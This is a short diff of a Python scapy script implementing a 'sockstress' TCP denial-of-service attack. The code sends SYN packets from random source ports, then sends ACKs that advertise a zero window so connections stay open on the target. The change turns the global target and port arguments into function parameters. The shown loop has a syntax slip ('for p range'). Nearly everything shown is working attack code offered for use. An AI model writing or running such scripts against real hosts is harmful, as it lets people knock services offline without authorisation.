@@ -10,11 +10,11 @@ import random
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 
-def sockstress():
+def sockstress(target, port):
  for p range (int(args.CONECT)):
   x = random.randint(0,65535)
-  response = sr1(IP(dst=args.USER)/TCP(sport=x,dport=args.PORT,flags='S'),timeout=1,verbose=0) 
-  send(IP(dst=args.USER)/TCP(dport=args.PORT,sport=x,window=0,flags='A',ack=(response[TCP].seq + 1))/'\x00\x00',verbose=0)
+  response = sr1(IP(dst=target)/TCP(sport=x,dport=port,flags='S'),timeout=1,verbose=0) 
+  send(IP(dst=target)/TCP(dport=port,sport=x,window=0,flags='A',ack=(response[TCP].seq + 1))/'\x00\x00',verbose=0)
 
 
 
